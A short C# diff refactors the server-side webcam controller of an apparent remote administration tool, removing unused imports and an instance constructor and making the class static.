@@ -1,26 +1,15 @@
 ﻿using Serveur.Controllers.Server;
 using Serveur.Packets.ClientPackets;
 using Serveur.Packets.ServerPackets;
-using System;
-using System.Collections.Generic;
 using System.Drawing;
 using System.IO;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace Serveur.Controllers
 {
-    public class FrmRemoteWebcamController
+    public static class FrmRemoteWebcamController
     {
         //Propriétés
-        public ClientMosaic client;
         public static string[] webcams;
-
-        public FrmRemoteWebcamController(ClientMosaic client)
-        {
-            this.client = client;
-        }
 
         public static void getAvailableWebcamsResponse(ClientMosaic client, GetAvailableWebcamsResponse packet)
         {
